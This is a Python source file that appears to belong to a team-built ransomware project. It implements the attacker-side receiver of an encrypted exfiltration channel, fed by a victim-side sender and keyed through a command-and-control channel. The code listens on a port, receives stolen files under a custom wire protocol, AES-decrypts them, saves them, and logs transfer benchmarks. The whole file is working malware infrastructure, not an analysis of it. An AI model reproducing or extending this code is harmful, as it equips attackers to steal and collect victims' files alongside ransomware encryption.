"""
attacker/transfer_receiver.py  —  Person 1
Attacker-side receiver for the encrypted exfiltration channel.

Listens on config.TRANSFER_PORT, receives files sent by victim/transfer_sender.py,
AES-decrypts them, and writes originals to a local 'received/' directory.

Wire Protocol (per file, sent by victim)
-----------------------------------------
    [4B  filename_len  BE uint32 ]
    [N   filename  utf-8         ]
    [8B  filesize   BE uint64    ]   (size of the *encrypted* payload)
    [16B IV                      ]
    [32B AES session key         ]   (plaintext for exfiltration path — same key on both sides)
    [<filesize> encrypted bytes  ]

Note: The exfiltration path uses a *shared* AES key (known to both sides), unlike
the local ransomware encryption path which uses RSA-wrapped per-file keys.
The shared key is negotiated via the C2 channel (PUSH_KEY command) before transfer starts.

Log format: JSON-lines → logs/transfer.log
"""

import sys
import os
import socket
import struct
import json
import time
import logging
from datetime import datetime, timezone
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

import config
from shared.crypto import aes_decrypt


# ──────────────────────────────────────────────────────────────────────────────
# Logging
# ──────────────────────────────────────────────────────────────────────────────

def _setup_logger(log_dir: str) -> logging.Logger:
    Path(log_dir).mkdir(parents=True, exist_ok=True)
    log_path = Path(log_dir) / "transfer.log"
    logger = logging.getLogger("transfer_receiver")
    logger.setLevel(logging.DEBUG)
    if not logger.handlers:
        fh = logging.FileHandler(log_path)
        fh.setFormatter(logging.Formatter("%(message)s"))
        logger.addHandler(fh)
        sh = logging.StreamHandler(sys.stdout)
        sh.setFormatter(logging.Formatter("[transfer_receiver] %(message)s"))
        logger.addHandler(sh)
    return logger


def _log(logger: logging.Logger, event: str, **extra) -> None:
    record = {
        "ts": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
        "module": "transfer",
        "event": event,
        **extra,
    }
    logger.info(json.dumps(record))


# ──────────────────────────────────────────────────────────────────────────────
# Socket I/O helpers
# ──────────────────────────────────────────────────────────────────────────────

def _recv_exact(sock: socket.socket, n: int) -> bytes:
    """Read exactly *n* bytes from *sock*, raising ConnectionError on premature close."""
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError(f"Socket closed after {len(buf)}/{n} bytes")
        buf += chunk
    return buf


# ──────────────────────────────────────────────────────────────────────────────
# Per-file receive logic
# ──────────────────────────────────────────────────────────────────────────────

def _receive_one_file(
    conn: socket.socket,
    output_dir: Path,
    logger: logging.Logger,
    results: list,
) -> bool:
    """
    Receive, decrypt, and save one file.

    Returns True on success, False when the sender signals 'no more files'
    (sends a sentinel 4-byte zero: filename_len == 0).
    """
    # ── Header: filename length ──────────────────────────────────────────────
    raw_len = _recv_exact(conn, 4)
    fname_len = struct.unpack(">I", raw_len)[0]

    if fname_len == 0:
        # Sentinel: end of transfer session
        return False

    # ── Header: filename, filesize, IV, session key ──────────────────────────
    filename   = _recv_exact(conn, fname_len).decode("utf-8")
    filesize   = struct.unpack(">Q", _recv_exact(conn, 8))[0]
    iv         = _recv_exact(conn, 16)
    aes_key    = _recv_exact(conn, 32)

    _log(logger, "file_incoming", filename=filename, encrypted_bytes=filesize)

    # ── Payload: encrypted file content ─────────────────────────────────────
    t_start = time.perf_counter()
    ciphertext = _recv_exact(conn, filesize)

    # ── Decrypt ──────────────────────────────────────────────────────────────
    plaintext = aes_decrypt(ciphertext, iv, aes_key)
    elapsed_ms = (time.perf_counter() - t_start) * 1000

    # ── Write to disk ────────────────────────────────────────────────────────
    # Preserve sub-directory structure from sender if filename contains path sep
    safe_name = Path(filename).name   # strip any path prefix for safety
    out_path = output_dir / safe_name
    out_path.parent.mkdir(parents=True, exist_ok=True)
    with open(out_path, "wb") as fh:
        fh.write(plaintext)

    size_mb   = len(plaintext) / 1_000_000
    throughput = size_mb / (elapsed_ms / 1000) if elapsed_ms > 0 else 0.0

    _log(
        logger,
        "file_received",
        filename=safe_name,
        plaintext_bytes=len(plaintext),
        elapsed_ms=round(elapsed_ms, 2),
        throughput_mbps=round(throughput, 4),
        output_path=str(out_path),
    )
    print(
        f"[transfer_receiver] ✓ {safe_name}  "
        f"({len(plaintext):,} B  {throughput:.2f} MB/s)"
    )

    results.append({
        "filename": safe_name,
        "plaintext_bytes": len(plaintext),
        "elapsed_ms": round(elapsed_ms, 2),
        "throughput_mbps": round(throughput, 4),
    })
    return True


# ──────────────────────────────────────────────────────────────────────────────
# Session handler
# ──────────────────────────────────────────────────────────────────────────────

def _handle_transfer_session(
    conn: socket.socket,
    addr: tuple,
    output_dir: Path,
    logger: logging.Logger,
    benchmark_path: str,
) -> None:
    peer = f"{addr[0]}:{addr[1]}"
    _log(logger, "session_started", peer=peer)
    results: list = []

    try:
        with conn:
            while _receive_one_file(conn, output_dir, logger, results):
                pass
    except ConnectionError as exc:
        _log(logger, "session_error", peer=peer, error=str(exc))
    finally:
        _log(logger, "session_ended", peer=peer, files_received=len(results))
        _save_benchmarks(results, benchmark_path)


def _save_benchmarks(results: list, benchmark_path: str) -> None:
    if not results:
        return
    Path(benchmark_path).parent.mkdir(parents=True, exist_ok=True)
    with open(benchmark_path, "w") as fh:
        json.dump(results, fh, indent=2)
    print(f"[transfer_receiver] Benchmarks → {benchmark_path}")


# ──────────────────────────────────────────────────────────────────────────────
# Public entry point
# ──────────────────────────────────────────────────────────────────────────────

def run_receiver(
    host: str = "0.0.0.0",
    port: int = config.TRANSFER_PORT,
    output_dir: str | None = None,
    log_dir: str = config.LOG_DIR,
    benchmark_path: str | None = None,
) -> None:
    """
    Start the transfer receiver and block until the session completes.

    Parameters
    ----------
    host          : str — listen address (default: all interfaces)
    port          : int — port matching victim's transfer_sender (config.TRANSFER_PORT)
    output_dir    : str — where to write decrypted files (default: ./received/)
    log_dir       : str — directory for transfer.log
    benchmark_path: str — path to save per-file transfer benchmarks JSON
    """
    logger = _setup_logger(log_dir)

    out = Path(output_dir) if output_dir else Path(__file__).parent / "received"
    out.mkdir(parents=True, exist_ok=True)

    bench = benchmark_path or str(Path(config.RESULTS_DIR) / "transfer_benchmarks.json")

    _log(logger, "receiver_starting", host=host, port=port, output_dir=str(out))
    print(f"[transfer_receiver] Listening on {host}:{port} …")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((host, port))
        srv.listen(1)

        while True:
            try:
                conn, addr = srv.accept()
                _handle_transfer_session(conn, addr, out, logger, bench)
            except KeyboardInterrupt:
                _log(logger, "receiver_shutdown", reason="KeyboardInterrupt")
                print("\n[transfer_receiver] Shutting down.")
                break


if __name__ == "__main__":
    run_receiver()
